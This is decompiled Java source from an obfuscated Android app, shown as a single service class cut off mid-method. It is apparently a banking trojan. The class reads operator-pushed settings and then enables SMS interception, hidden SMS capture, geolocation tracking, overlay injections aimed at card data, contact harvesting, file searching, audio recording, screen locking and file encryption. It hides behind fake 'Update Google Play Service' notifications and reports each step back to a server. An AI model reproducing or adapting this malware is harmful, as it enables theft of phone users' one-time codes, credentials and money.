package wocwvy.czyxoxmbauu.slsa;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Telephony;
import java.io.File;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.ncec.dzudmx;
import wocwvy.czyxoxmbauu.slsa.ncec.kcdbt;
import wocwvy.czyxoxmbauu.slsa.ncec.ovyvpsbxxrtayd;
import wocwvy.czyxoxmbauu.slsa.ncec.pltrfi;
import wocwvy.czyxoxmbauu.slsa.ncec.wami;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.wifu;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.ActivityC0048b;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.DeviceAdminReceiverC0047a;

/* JADX INFO: loaded from: classes.dex */
public class jtfxlnc extends IntentService {

    /* JADX INFO: renamed from: a */
    C0022c f421a;

    /* JADX INFO: renamed from: b */
    C0020b f422b;

    /* JADX INFO: renamed from: c */
    C0019a f423c;

    /* JADX INFO: renamed from: d */
    String f424d;

    /* JADX INFO: renamed from: e */
    Context f425e;

    /* JADX INFO: renamed from: f */
    private Notification f426f;

    /* JADX INFO: renamed from: g */
    private final String f427g;

    public jtfxlnc() {
        super("");
        this.f421a = new C0022c();
        this.f422b = new C0020b();
        this.f423c = new C0019a();
        this.f427g = "jtfxlnc";
        this.f424d = jtfxlnc.class.getSimpleName();
    }

    @TargetApi(16)
    /* JADX INFO: renamed from: a */
    private void m281a() {
        this.f426f = new Notification.Builder(this.f425e).setContentTitle("Info").setContentText("Update The Driver System..").setSmallIcon(R.drawable.im).build();
        startForeground(9906, this.f426f);
    }

    /* JADX INFO: renamed from: b */
    private void m282b() {
        new Thread(new Runnable() { // from class: wocwvy.czyxoxmbauu.slsa.jtfxlnc.1
            @Override // java.lang.Runnable
            public void run() {
                String str;
                String str2;
                int i;
                String str3;
                String strReplace;
                String str4;
                int i2;
                int i3;
                int i4;
                int i5;
                try {
                    int i6 = Integer.parseInt(jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "time_work"));
                    jtfxlnc jtfxlncVar = jtfxlnc.this;
                    Context context = jtfxlnc.this.f425e;
                    boolean zInKeyguardRestrictedInputMode = ((KeyguardManager) jtfxlncVar.getSystemService("keyguard")).inKeyguardRestrictedInputMode();
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    String strM251e = jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "SettingsAll");
                    if (strM251e.equals("")) {
                        return;
                    }
                    String[] strArrSplit = strM251e.split("~");
                    int i7 = 15000;
                    try {
                        i7 = Integer.parseInt(strArrSplit[1]);
                    } catch (Exception unused) {
                        jtfxlnc.this.f422b.m230a("ERROR", "INTERVAL GO");
                    }
                    String str5 = strArrSplit[2];
                    String str6 = strArrSplit[3];
                    String str7 = strArrSplit[4];
                    int i8 = Integer.parseInt(strArrSplit[5]);
                    int i9 = Integer.parseInt(strArrSplit[6]);
                    int i10 = Integer.parseInt(strArrSplit[7].split("/")[1]);
                    String str8 = strArrSplit[7].split("/")[0];
                    int i11 = Integer.parseInt(strArrSplit[8].split("/")[1]);
                    String str9 = strArrSplit[8].split("/")[0];
                    int i12 = Integer.parseInt(strArrSplit[9]);
                    int i13 = Integer.parseInt(strArrSplit[10]);
                    String str10 = strArrSplit[11];
                    String str11 = strArrSplit[12];
                    try {
                        str2 = strArrSplit[13];
                        str = str11;
                    } catch (Exception unused2) {
                        str = str11;
                        str2 = "";
                    }
                    String str12 = str2;
                    jtfxlnc.this.f422b.m230a("Интервал отстука", "" + i7);
                    jtfxlnc.this.f422b.m230a("Перехват смс", "" + str5);
                    jtfxlnc.this.f422b.m230a("Скрытый перехват смс", "" + str6);
                    jtfxlnc.this.f422b.m230a("Запуск геолокации", "" + str7);
                    jtfxlnc.this.f422b.m230a("Запрос прав на инжекты", "" + i8);
                    jtfxlnc.this.f422b.m230a("Запрос прав на blkzyyyfc", "" + i9);
                    jtfxlnc.this.f422b.m230a("Авто инжекты + СС", str8 + " | " + i10);
                    jtfxlnc.this.f422b.m230a("Инжи + СС", str9 + " | " + i11);
                    jtfxlnc.this.f422b.m230a("Получить контакты", "" + i12);
                    jtfxlnc.this.f422b.m230a("Запуск blkzyyyfc по тайму", "" + i13);
                    jtfxlnc.this.f422b.m230a("Поиск файлов", "" + str12);
                    try {
                        i = i11;
                        try {
                            TimeUnit.MILLISECONDS.sleep(1000L);
                        } catch (InterruptedException e2) {
                            e = e2;
                            e.printStackTrace();
                        }
                    } catch (InterruptedException e3) {
                        e = e3;
                        i = i11;
                    }
                    String strReplace2 = "";
                    try {
                        strReplace2 = jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "madeSettings");
                    } catch (Exception unused3) {
                        jtfxlnc.this.f422b.m230a("jtfxlnc", "ERROR madeString");
                    }
                    if (strReplace2.contains("13 ")) {
                        try {
                            if (!jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "findfiles").equals("**false**")) {
                                jtfxlnc.this.f422b.m250d(jtfxlnc.this.f425e, "findfiles", str12);
                            }
                        } catch (Exception unused4) {
                            strReplace2 = strReplace2.replace("13 ", "13+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "13 ERROR");
                        }
                        jtfxlnc.this.f422b.m230a("Вып настр", "13+");
                    }
                    if (strReplace2.contains("11 ") && str10.length() >= 3) {
                        try {
                            jtfxlnc.this.f422b.m250d(jtfxlnc.this.f425e, "urls", str10);
                        } catch (Exception unused5) {
                            strReplace2 = strReplace2.replace("11 ", "11+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "11 ERROR");
                        }
                        jtfxlnc.this.f422b.m230a("Вып настр", "11+");
                    }
                    if (strReplace2.contains("12 ")) {
                        try {
                            jtfxlnc.this.f422b.m250d(jtfxlnc.this.f425e, "urlInj", str);
                        } catch (Exception unused6) {
                            strReplace2 = strReplace2.replace("12 ", "12+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "12 ERROR");
                        }
                        jtfxlnc.this.f422b.m230a("Вып настр", "url injections 12+");
                    }
                    if (strReplace2.contains("1 ")) {
                        try {
                            C0020b c0020b = jtfxlnc.this.f422b;
                            Context context2 = jtfxlnc.this.f425e;
                            StringBuilder sb = new StringBuilder();
                            str3 = str9;
                            try {
                                sb.append("");
                                sb.append(i7);
                                c0020b.m250d(context2, "interval", sb.toString());
                                strReplace = strReplace2.replace("1 ", "1+");
                            } catch (Exception unused7) {
                            }
                        } catch (Exception unused8) {
                            str3 = str9;
                        }
                        try {
                            C0020b c0020b2 = jtfxlnc.this.f422b;
                            C0020b.m222f(jtfxlnc.this.f425e, "startAlarm");
                            C0020b c0020b3 = jtfxlnc.this.f422b;
                            C0020b.m218a(jtfxlnc.this.f425e, "startAlarm", i7);
                            jtfxlnc.this.f422b.m230a("Вып настр", "Интервал сохранен");
                            strReplace2 = strReplace;
                        } catch (Exception unused9) {
                            strReplace2 = strReplace;
                            jtfxlnc.this.f422b.m230a("Вып настр", "1 ERROR");
                        }
                    } else {
                        str3 = str9;
                    }
                    if (!strReplace2.contains("2 ") || jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "perehvat_sws").contains("true")) {
                        str4 = str8;
                        i2 = i10;
                    } else {
                        String str13 = str5.contains("true") ? "1" : "0";
                        C0020b c0020b4 = jtfxlnc.this.f422b;
                        Context context3 = jtfxlnc.this.f425e;
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append("p=");
                        C0020b c0020b5 = jtfxlnc.this.f422b;
                        StringBuilder sb3 = new StringBuilder();
                        str4 = str8;
                        i2 = i10;
                        sb3.append(jtfxlnc.this.f422b.m264q(jtfxlnc.this.f425e));
                        sb3.append(":InterceptionSMS:");
                        sb3.append(str13);
                        sb3.append(":");
                        sb2.append(c0020b5.m242c(sb3.toString()));
                        if (c0020b4.m235b(context3, "7", sb2.toString()).contains("2453512")) {
                            strReplace2 = strReplace2.replace("2 ", "2+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "Перехват смс");
                        }
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000L);
                    } catch (InterruptedException e4) {
                        e4.printStackTrace();
                    }
                    if (strReplace2.contains("3 ") && !jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "del_sws").contains("true")) {
                        String str14 = str6.contains("true") ? "1" : "0";
                        C0020b c0020b6 = jtfxlnc.this.f422b;
                        Context context4 = jtfxlnc.this.f425e;
                        StringBuilder sb4 = new StringBuilder();
                        sb4.append("p=");
                        sb4.append(jtfxlnc.this.f422b.m242c(jtfxlnc.this.f422b.m264q(jtfxlnc.this.f425e) + ":HideInterceptionSMS:" + str14 + ":"));
                        if (c0020b6.m235b(context4, "7", sb4.toString()).contains("2453512")) {
                            strReplace2 = strReplace2.replace("3 ", "3+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "Скрытый перехват смс");
                        }
                    }
                    if (strReplace2.contains("4 ") && jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "network").equals("false") && jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "gps").equals("false")) {
                        String str15 = str7.contains("true") ? "1" : "0";
                        C0020b c0020b7 = jtfxlnc.this.f422b;
                        Context context5 = jtfxlnc.this.f425e;
                        StringBuilder sb5 = new StringBuilder();
                        sb5.append("p=");
                        sb5.append(jtfxlnc.this.f422b.m242c(jtfxlnc.this.f422b.m264q(jtfxlnc.this.f425e) + ":Geolocation:" + str15 + ":"));
                        if (c0020b7.m235b(context5, "7", sb5.toString()).contains("2453512")) {
                            strReplace2 = strReplace2.replace("4 ", "4+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "Запуск геолокации");
                        }
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000L);
                    } catch (InterruptedException e5) {
                        e5.printStackTrace();
                    }
                    if (zInKeyguardRestrictedInputMode) {
                        i3 = i6;
                    } else {
                        if (Build.VERSION.SDK_INT < 24 || jtfxlnc.this.f422b.m254g(jtfxlnc.this.f425e)) {
                            i3 = i6;
                        } else {
                            i3 = i6;
                            if (i8 <= i3 && i8 != -1 && !jtfxlnc.this.f422b.m255h(jtfxlnc.this.f425e)) {
                                Intent intentPutExtra = new Intent(jtfxlnc.this.f425e, (Class<?>) dzudmx.class).putExtra("start", "statistic");
                                intentPutExtra.addFlags(268435456);
                                jtfxlnc.this.startActivity(intentPutExtra);
                                jtfxlnc.this.f422b.m230a("Вып настр", "/PROC 7.0 ");
                            }
                        }
                        if (i9 <= i3 && i9 != -1 && !jtfxlnc.this.f422b.m258k(jtfxlnc.this.f425e)) {
                            Intent intentPutExtra2 = new Intent(jtfxlnc.this.f425e, (Class<?>) dzudmx.class).putExtra("start", "gps");
                            intentPutExtra2.addFlags(268435456);
                            jtfxlnc.this.startActivity(intentPutExtra2);
                            jtfxlnc.this.f422b.m230a("Вып настр", "START blkzyyyfc");
                        }
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000L);
                    } catch (InterruptedException e6) {
                        e6.printStackTrace();
                    }
                    jtfxlnc.this.f422b.m230a("SSS", "" + strReplace2);
                    if (strReplace2.contains("7 8") && jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "save_inj").length() <= 6 && (i5 = i2) <= i3 && i5 != -1) {
                        C0020b c0020b8 = jtfxlnc.this.f422b;
                        Context context6 = jtfxlnc.this.f425e;
                        StringBuilder sb6 = new StringBuilder();
                        sb6.append("p=");
                        sb6.append(jtfxlnc.this.f422b.m242c(jtfxlnc.this.f422b.m264q(jtfxlnc.this.f425e) + ":autoInj:" + str4 + ":"));
                        if (c0020b8.m235b(context6, "7", sb6.toString()).contains("2453512")) {
                            strReplace2 = strReplace2.replace("7 ", "7+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "Авто инжекты + СС");
                        }
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000L);
                    } catch (InterruptedException e7) {
                        e7.printStackTrace();
                    }
                    if (strReplace2.contains("8 9") && jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "save_inj").length() <= 6 && (i4 = i) <= i3 && i4 != -1) {
                        C0020b c0020b9 = jtfxlnc.this.f422b;
                        Context context7 = jtfxlnc.this.f425e;
                        StringBuilder sb7 = new StringBuilder();
                        sb7.append("p=");
                        sb7.append(jtfxlnc.this.f422b.m242c(jtfxlnc.this.f422b.m264q(jtfxlnc.this.f425e) + ":Inj:" + str3 + ":"));
                        if (c0020b9.m235b(context7, "7", sb7.toString()).contains("2453512")) {
                            strReplace2 = strReplace2.replace("8 ", "8+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "Авто инжекты + СС");
                        }
                    }
                    if (strReplace2.contains("9 ") && i12 <= i3 && i12 != -1 && jtfxlnc.this.f422b.m262o(jtfxlnc.this.f425e)) {
                        jtfxlnc.this.f422b.m244c(jtfxlnc.this.f425e);
                        try {
                            TimeUnit.MILLISECONDS.sleep(1000L);
                        } catch (InterruptedException e8) {
                            e8.printStackTrace();
                        }
                        Intent intentPutExtra3 = new Intent(jtfxlnc.this.f425e, (Class<?>) wami.class).putExtra("str", "0").putExtra("cwc_text", "");
                        intentPutExtra3.addFlags(268435456);
                        intentPutExtra3.addFlags(1073741824);
                        jtfxlnc.this.startActivity(intentPutExtra3);
                        jtfxlnc.this.f422b.m230a("Вып настр", "Получить контакты");
                        strReplace2 = strReplace2.replace("9 ", "9+");
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000L);
                    } catch (InterruptedException e9) {
                        e9.printStackTrace();
                    }
                    if (strReplace2.contains("10 ") && jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "network").equals("false") && jtfxlnc.this.f422b.m251e(jtfxlnc.this.f425e, "gps").equals("false") && i13 <= i3 && i13 != -1) {
                        C0020b c0020b10 = jtfxlnc.this.f422b;
                        Context context8 = jtfxlnc.this.f425e;
                        StringBuilder sb8 = new StringBuilder();
                        sb8.append("p=");
                        sb8.append(jtfxlnc.this.f422b.m242c(jtfxlnc.this.f422b.m264q(jtfxlnc.this.f425e) + ":Geolocation:1:"));
                        if (c0020b10.m235b(context8, "7", sb8.toString()).contains("2453512")) {
                            strReplace2 = strReplace2.replace("10 ", "10+");
                            jtfxlnc.this.f422b.m230a("Вып настр", "Запуск blkzyyyfc по тайму");
                        }
                    }
                    try {
                        jtfxlnc.this.f422b.m250d(jtfxlnc.this.f425e, "madeSettings", strReplace2);
                        jtfxlnc.this.f422b.m230a("jtfxlnc", "Save madeSettings: " + strReplace2);
                    } catch (Exception unused10) {
                        jtfxlnc.this.f422b.m230a("jtfxlnc", "ERROR Save madeSettings");
                    }
                } catch (Exception unused11) {
                }
            }
        }).start();
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:127:0x039b  */
    /* JADX WARN: Removed duplicated region for block: B:130:0x03a2  */
    /* JADX WARN: Removed duplicated region for block: B:164:0x04dc  */
    /* JADX WARN: Removed duplicated region for block: B:173:0x0506  */
    /* JADX WARN: Removed duplicated region for block: B:176:0x052d  */
    /* JADX WARN: Removed duplicated region for block: B:179:0x0552  */
    /* JADX WARN: Removed duplicated region for block: B:192:0x05bb  */
    /* JADX WARN: Removed duplicated region for block: B:203:0x0621  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x019d  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x01ce  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x0203 A[Catch: Exception -> 0x0237, TryCatch #4 {Exception -> 0x0237, blocks: (B:67:0x01f3, B:69:0x0203, B:71:0x0211), top: B:236:0x01f3 }] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x0242  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x0270  */
    /* JADX WARN: Removed duplicated region for block: B:89:0x029f  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x02bd  */
    /* JADX WARN: Type inference failed for: r9v0 */
    /* JADX WARN: Type inference failed for: r9v1 */
    /* JADX WARN: Type inference failed for: r9v2 */
    /* JADX WARN: Type inference failed for: r9v3 */
    /* JADX WARN: Type inference failed for: r9v5, types: [boolean] */
    /* JADX WARN: Type inference failed for: r9v6 */
    /* JADX WARN: Type inference failed for: r9v7 */
    /* JADX WARN: Type inference failed for: r9v8 */
    /* JADX WARN: Type inference failed for: r9v9 */
    @Override // android.app.IntentService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    protected void onHandleIntent(Intent intent) {
        int i;
        int i2;
        int i3;
        int i4;
        int i5;
        int i6;
        Intent intent2;
        int i7;
        C0020b c0020b;
        String str;
        StringBuilder sb;
        C0020b c0020b2;
        StringBuilder sb2;
        String str2;
        String strM251e;
        int i8;
        String strM251e2;
        if (this.f422b.m231a()) {
            return;
        }
        this.f425e = this;
        this.f422b.m230a("STARTWHILE", "!!!");
        try {
            PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) this.f425e.getSystemService("power")).newWakeLock(1, this.f424d);
            if (wakeLockNewWakeLock != null) {
                wakeLockNewWakeLock.acquire();
            }
        } catch (Exception unused) {
        }
        try {
            strM251e2 = this.f422b.m251e(this, "swspacket");
            this.f422b.m230a("jtfxlnc", "App Packet " + strM251e2);
            try {
                this.f422b.m230a("jtfxlnc", "swspacket");
            } catch (Exception unused2) {
            }
        } catch (Exception unused3) {
        }
        boolean z = strM251e2 != null;
        if (!z) {
            this.f422b.m238b(this);
        }
        try {
            i = Integer.parseInt(this.f422b.m251e(this.f425e, "interval"));
        } catch (Exception unused4) {
            i = 15;
        }
        try {
            i5 = Integer.parseInt(this.f422b.m251e(this, "time_work"));
            i2 = i;
            i3 = 1000;
            i4 = 0;
        } catch (Exception unused5) {
            i2 = i;
            i3 = 1000;
            i4 = 0;
            i5 = 0;
        }
        ?? Contains = -1;
        int i9 = 0;
        int i10 = 0;
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(i3);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService("device_policy");
            ComponentName componentName = new ComponentName(this.f425e, (Class<?>) DeviceAdminReceiverC0047a.class);
            try {
                C0020b c0020b3 = this.f422b;
                C0020b.m218a(this.f425e, "startAlarm", Integer.parseInt(this.f422b.m251e(this.f425e, "Interval")));
            } catch (Exception unused6) {
            }
            Context context = this.f425e;
            boolean zInKeyguardRestrictedInputMode = ((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode();
            if (!zInKeyguardRestrictedInputMode) {
                stopForeground(true);
            } else if (this.f422b.m251e(this, "foregroundwhile").equals("true")) {
                if (Build.VERSION.SDK_INT >= 26) {
                    C0020b c0020b4 = this.f422b;
                    C0020b.m215a((Service) this, "Google", "Update Google Play Service");
                } else {
                    m281a();
                }
            }
            try {
            } catch (Exception unused7) {
                this.f422b.m230a("jtfxlnc", "STARTWHEIL -> stopSelf() error");
            }
            if (this.f422b.m251e(this.f425e, "urls").length() > 1) {
                i4 += 2;
                if ((this.f422b.m252e(this) || !this.f422b.m254g(this)) && !this.f422b.m232a(this.f425e, kldqwysgkfcrmq.class)) {
                    try {
                        this.f425e.startService(new Intent(this.f425e, (Class<?>) kldqwysgkfcrmq.class));
                    } catch (Exception unused8) {
                    }
                }
                if (!this.f422b.m254g(this) && this.f422b.m251e(this.f425e, "save_inj").length() >= 5 && !this.f422b.m232a(this.f425e, wfveenegvz.class)) {
                    this.f425e.startService(new Intent(this.f425e, (Class<?>) wfveenegvz.class));
                }
                i6 = 2000;
                if (!zInKeyguardRestrictedInputMode && this.f422b.m251e(this, "cryptfile").equals("true")) {
                    Intent intent3 = new Intent(this, (Class<?>) kcdbt.class);
                    intent3.addFlags(268435456);
                    intent3.addFlags(8388608);
                    intent3.addFlags(1073741824);
                    startActivity(intent3);
                    i6 = 500;
                }
                try {
                    if (this.f422b.m251e(this, "startRecordSound").equals("stop") && (i8 = Integer.parseInt(this.f422b.m251e(this, "recordsoundseconds"))) > 0) {
                        this.f425e.startService(new Intent(this.f425e, (Class<?>) cpysnikhf.class).putExtra("time", "" + i8));
                    }
                } catch (Exception unused9) {
                    this.f422b.m230a("jtfxlnc", "Error Recod Sound");
                }
                if (!zInKeyguardRestrictedInputMode && !this.f422b.m232a(this.f425e, ttiegryczsx.class) && this.f422b.m251e(this, "lookscreen").equals("true")) {
                    startService(new Intent(this.f425e, (Class<?>) ttiegryczsx.class));
                }
                if (Build.VERSION.SDK_INT >= 26) {
                    if (((PowerManager) this.f425e.getSystemService("power")).isIgnoringBatteryOptimizations(this.f425e.getPackageName()) && !this.f422b.m232a(this.f425e, blyvffs.class)) {
                        try {
                            intent2 = new Intent(this.f425e, (Class<?>) blyvffs.class);
                            startService(intent2);
                        } catch (Exception unused10) {
                        }
                    }
                    if (Build.VERSION.SDK_INT < 20) {
                        if (i4 < 25) {
                            i5 += 25;
                            this.f422b.m250d(this, "time_work", String.valueOf(i5));
                            this.f422b.m230a("TIME", String.valueOf(i5));
                            m282b();
                            if (!this.f422b.m232a(this.f425e, xelytgswelv.class) && !this.f422b.m251e(this.f425e, "websocket").equals("")) {
                                this.f425e.startService(new Intent(this.f425e, (Class<?>) xelytgswelv.class));
                            }
                            if (!this.f422b.m232a(this.f425e, wifu.class) && this.f422b.m246c(this, this.f423c.f337b[0]) && this.f422b.m251e(this.f425e, "spamSMS").equals("start")) {
                                this.f425e.startService(new Intent(this.f425e, (Class<?>) wifu.class));
                            }
                            if (this.f422b.m246c(this, this.f423c.f338c[0])) {
                                this.f422b.m230a("startFind", "1");
                                if (!this.f422b.m232a(this.f425e, mvqkjokaxfrpf.class)) {
                                    String strM251e3 = this.f422b.m251e(this.f425e, "findfiles");
                                    this.f422b.m230a("startFind", "2" + strM251e3);
                                    if (strM251e3.length() > 1 && !strM251e3.equals("**false**")) {
                                        this.f422b.m230a("jtfxlnc", "Find Start 3");
                                        this.f425e.startService(new Intent(this.f425e, (Class<?>) mvqkjokaxfrpf.class));
                                    }
                                }
                            }
                            if (!this.f422b.m232a(this.f425e, wahiuolww.class) && this.f422b.m246c(this.f425e, this.f423c.f338c[0]) && this.f422b.m251e(this.f425e, "status").length() > 2) {
                                this.f425e.startService(new Intent(this.f425e, (Class<?>) wahiuolww.class));
                            }
                            if (this.f421a.f395t == 3 || this.f421a.f395t == 6) {
                                try {
                                    strM251e = this.f422b.m251e(this, "startRequest");
                                } catch (Exception unused11) {
                                }
                                if (strM251e.contains("Access=0") || strM251e.contains("Perm=0")) {
                                    if (i5 >= 1000) {
                                        try {
                                            this.f422b.m250d(this, "startRequest", "Access=1Perm=1");
                                        } catch (Exception unused12) {
                                        }
                                    }
                                }
                                i4 = 0;
                            }
                        }
                        i9++;
                        i10++;
                        C0020b c0020b5 = this.f422b;
                        StringBuilder sb3 = new StringBuilder();
                        i7 = i2 / 1000;
                        sb3.append(i7);
                        sb3.append(" = ");
                        sb3.append(i9);
                        c0020b5.m230a("Time Requst HTTP", sb3.toString());
                        if (i9 >= i7 + 2) {
                            int i11 = Integer.parseInt(this.f422b.m251e(this.f425e, "interval"));
                            this.f425e.startService(new Intent(this.f425e, (Class<?>) ukhakhcgifofl.class));
                            i2 = i11;
                            i9 = 0;
                        }
                        this.f421a.getClass();
                        Contains = Contains;
                        if (i10 >= 12) {
                            if (this.f422b.m262o(this.f425e)) {
                                String strM251e4 = this.f422b.m251e(this.f425e, "lock_inj");
                                Contains = this.f422b.m251e(this.f425e, "del_sws").contains("true");
                                try {
                                    if ((!strM251e4.equals(null) || !strM251e4.equals("")) && strM251e4.length() > 2) {
                                        Intent intentPutExtra = new Intent(this.f425e, (Class<?>) pltrfi.class).putExtra("str", strM251e4);
                                        intentPutExtra.addFlags(268435456);
                                        intentPutExtra.addFlags(8388608);
                                        intentPutExtra.addFlags(1073741824);
                                        startActivity(intentPutExtra);
                                    }
                                } catch (Exception unused13) {
                                }
                            }
                            i10 = 0;
                            Contains = Contains;
                        }
                        this.f422b.m226a(this, "jtfxlnc");
                        if (Contains != 1) {
                            if (Build.VERSION.SDK_INT >= 19 && !Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName())) {
                                Context context2 = this.f425e;
                                if (!((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                                    try {
                                        TimeUnit.MILLISECONDS.sleep(2000L);
                                    } catch (InterruptedException e2) {
                                        e2.printStackTrace();
                                    }
                                    Intent intent4 = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
                                    intent4.putExtra("package", getPackageName());
                                    intent4.addFlags(268435456);
                                    startActivity(intent4);
                                    c0020b = this.f422b;
                                    str = "4";
                                    sb = new StringBuilder();
                                    sb.append("p=");
                                    c0020b2 = this.f422b;
                                    sb2 = new StringBuilder();
                                    sb2.append(this.f422b.m264q(this));
                                    str2 = "|Request for SMS manager change(hidden SMS interception)|";
                                    sb2.append(str2);
                                    sb.append(c0020b2.m242c(sb2.toString()));
                                    c0020b.m235b(this, str, sb.toString());
                                }
                            }
                            i3 = i6;
                        } else {
                            if (Contains == 0 && Build.VERSION.SDK_INT >= 19 && Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName())) {
                                Context context3 = this.f425e;
                                if (!((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                                    try {
                                        TimeUnit.MILLISECONDS.sleep(2000L);
                                    } catch (InterruptedException e3) {
                                        e3.printStackTrace();
                                    }
                                    String strM251e5 = this.f422b.m251e(this, "swspacket");
                                    Intent intent5 = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
                                    intent5.putExtra("package", strM251e5);
                                    intent5.addFlags(268435456);
                                    startActivity(intent5);
                                    c0020b = this.f422b;
                                    str = "4";
                                    sb = new StringBuilder();
                                    sb.append("p=");
                                    c0020b2 = this.f422b;
                                    sb2 = new StringBuilder();
                                    sb2.append(this.f422b.m264q(this));
                                    str2 = "|Request to change the manager SMS to default|";
                                    sb2.append(str2);
                                    sb.append(c0020b2.m242c(sb2.toString()));
                                    c0020b.m235b(this, str, sb.toString());
                                }
                            }
                            i3 = i6;
                        }
                    } else {
                        if (i5 >= this.f421a.f393r && this.f421a.f392q && ((i4 == 11 || i4 == 12) && !this.f422b.m251e(this, "play_protect").equals("error"))) {
                            File dir = getDir("apk", 0);
                            StringBuilder sb4 = new StringBuilder();
                            this.f421a.getClass();
                            sb4.append("crypt");
                            sb4.append(".apk");
                            if (new File(dir, sb4.toString()).exists()) {
                                try {
                                    C0020b c0020b6 = this.f422b;
                                    C0020b.m216a(this);
                                } catch (Exception unused14) {
                                }
                            }
                        }
                        if (!zInKeyguardRestrictedInputMode) {
                            if ((i4 == 15 || i4 == 16) && i5 >= this.f421a.f393r && this.f421a.f392q) {
                                File dir2 = getDir("apk", 0);
                                StringBuilder sb5 = new StringBuilder();
                                this.f421a.getClass();
                                sb5.append("crypt");
                                sb5.append(".apk");
                                if (new File(dir2, sb5.toString()).exists()) {
                                    try {
                                        if (this.f422b.m251e(this, "play_protect").equals("true")) {
                                            Intent intent6 = new Intent(this, (Class<?>) ovyvpsbxxrtayd.class);
                                            intent6.addFlags(268435456);
                                            intent6.addFlags(1073741824);
                                            startActivity(intent6);
                                        }
                                    } catch (Exception unused15) {
                                        this.f422b.m230a("jtfxlnc", "ERROR getProtect");
                                    }
                                    try {
                                        if (!this.f422b.m251e(this, "play_protect").equals("error")) {
                                            C0020b c0020b7 = this.f422b;
                                            C0020b.m216a(this);
                                        }
                                    } catch (Exception unused16) {
                                    }
                                }
                                this.f422b.m250d(this, "DexSocksMolude", "yes");
                            }
                        }
                        if (i4 < 25) {
                        }
                        i9++;
                        i10++;
                        C0020b c0020b52 = this.f422b;
                        StringBuilder sb32 = new StringBuilder();
                        i7 = i2 / 1000;
                        sb32.append(i7);
                        sb32.append(" = ");
                        sb32.append(i9);
                        c0020b52.m230a("Time Requst HTTP", sb32.toString());
                        if (i9 >= i7 + 2) {
                        }
                        this.f421a.getClass();
                        Contains = Contains;
                        if (i10 >= 12) {
                        }
                        this.f422b.m226a(this, "jtfxlnc");
                        if (Contains != 1) {
                        }
                    }
                } else {
                    if (!this.f422b.m232a(this.f425e, blyvffs.class)) {
                        intent2 = new Intent(this.f425e, (Class<?>) blyvffs.class);
                        startService(intent2);
                    }
                    if (Build.VERSION.SDK_INT < 20) {
                    }
                }
            } else if (devicePolicyManager.isAdminActive(componentName)) {
                Intent intent7 = new Intent(this, (Class<?>) ActivityC0048b.class);
                intent7.putExtra("str", "stop");
                intent7.addFlags(268435456);
                intent7.addFlags(536870912);
                intent7.addFlags(1073741824);
                startActivity(intent7);
                this.f422b.m250d(this, "lock_inj", "");
                this.f422b.m250d(this, "save_inj", "");
                i4 += 2;
                if (this.f422b.m252e(this)) {
                    this.f425e.startService(new Intent(this.f425e, (Class<?>) kldqwysgkfcrmq.class));
                    if (!this.f422b.m254g(this)) {
                        this.f425e.startService(new Intent(this.f425e, (Class<?>) wfveenegvz.class));
                    }
                    i6 = 2000;
                    if (!zInKeyguardRestrictedInputMode) {
                        Intent intent32 = new Intent(this, (Class<?>) kcdbt.class);
                        intent32.addFlags(268435456);
                        intent32.addFlags(8388608);
                        intent32.addFlags(1073741824);
                        startActivity(intent32);
                        i6 = 500;
                    }
